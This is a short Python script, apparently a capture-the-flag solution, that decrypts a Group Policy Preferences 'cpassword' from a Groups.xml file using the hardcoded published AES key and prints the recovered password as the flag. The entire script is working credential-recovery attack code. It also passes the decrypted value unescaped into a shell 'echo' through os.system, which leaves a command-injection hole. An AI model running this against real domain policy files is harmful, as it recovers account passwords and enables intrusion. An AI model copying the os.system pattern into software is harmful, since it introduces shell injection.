from Crypto.Cipher import AES
import base64
import os


#get cpassword from Policies/{75DE8F0A-DEC0-441F-AE29-90DFAFCF632B}/User/Preferences/Groups/Groups.xml
cpassword = "PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw"
#get AES key from https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

#add padding to the base64 "cpassword"
padding = "=" * (4 - (len(cpassword) % 4))
b64password = "{}{}".format(cpassword, padding)

#decrypt the base64 string
decodedpassword =  base64.b64decode(b64password)

#intialise an AES object

mode = AES.MODE_CBC
#the AES.block_size is a fixed value of 16
iv = "\00" * AES.block_size
#actual initialisation
aes = AES.new(key, mode, iv)

#decrypt the password
flag = aes.decrypt(decodedpassword)
#remove the form feeds from the end of the string
#- not doing this causes IDLE to freeze up, not sure 
flag = flag.strip()
#convert the flag to utf-8
flag = flag.decode("utf16")
#print the flag
print("The flag is {}".format(flag))

#create the file "flag" in the current directory and populate it with the flag
os.system("touch flag")
os.system("echo {} >> flag".format(flag))
